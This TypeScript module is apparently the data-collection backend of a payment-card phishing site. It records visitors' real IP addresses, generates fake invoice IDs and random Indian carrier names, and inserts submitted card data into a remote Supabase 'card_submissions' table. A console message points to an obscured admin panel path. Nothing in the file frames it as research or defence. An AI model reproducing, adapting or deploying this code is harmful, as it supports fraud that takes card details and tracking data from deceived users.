
import { supabase } from '@/integrations/supabase/client';

export const getRealIP = async () => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.log('Could not fetch real IP, using fallback');
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  }
};

export const getRandomNetwork = () => {
  const networks = ['Airtel', 'Jio', 'Vi', 'BSNL'];
  return networks[Math.floor(Math.random() * networks.length)];
};

export const generateInvoiceId = () => {
  return `INV${Date.now()}${Math.floor(Math.random() * 1000)}`;
};

export const sendToSupabase = async (data: any) => {
  console.log('Sending data to Supabase:', data);
  
  try {
    const { data: insertedData, error } = await supabase
      .from('card_submissions')
      .insert([data])
      .select()
      .single();
    
    if (error) {
      console.error('Error inserting card data:', error);
      throw error;
    } else {
      console.log('Card data sent successfully to Supabase:', insertedData);
      return insertedData;
    }
  } catch (error) {
    console.error('Error with Supabase insertion:', error);
    throw error;
  }
};

export const initializeSupabaseConnection = async () => {
  try {
    const realIP = await getRealIP();
    
    console.log('Supabase: Initializing connection');
    console.log('Supabase: Sending visitor data with real IP:', realIP);
    console.log('Current window location:', window.location.href);
    console.log('Admin panel should be at:', window.location.origin + '/parking55009hvSweJimbs5hhinbd56y');
    
    // Test Supabase connection first
    const { data: testData, error: testError } = await supabase
      .from('visitors')
      .select('count', { count: 'exact', head: true });
    
    if (testError) {
      console.error('Supabase connection test failed:', testError);
      return;
    }
    
    console.log('Supabase connection test successful');
    
    // Insert or update visitor data
    const { error } = await supabase
      .from('visitors')
      .upsert({ ip: realIP }, { onConflict: 'ip' });
    
    if (error) {
      console.error('Error inserting visitor:', error);
    } else {
      console.log('Visitor data sent successfully via Supabase');
    }
  } catch (error) {
    console.error('Error with Supabase connection:', error);
  }
};
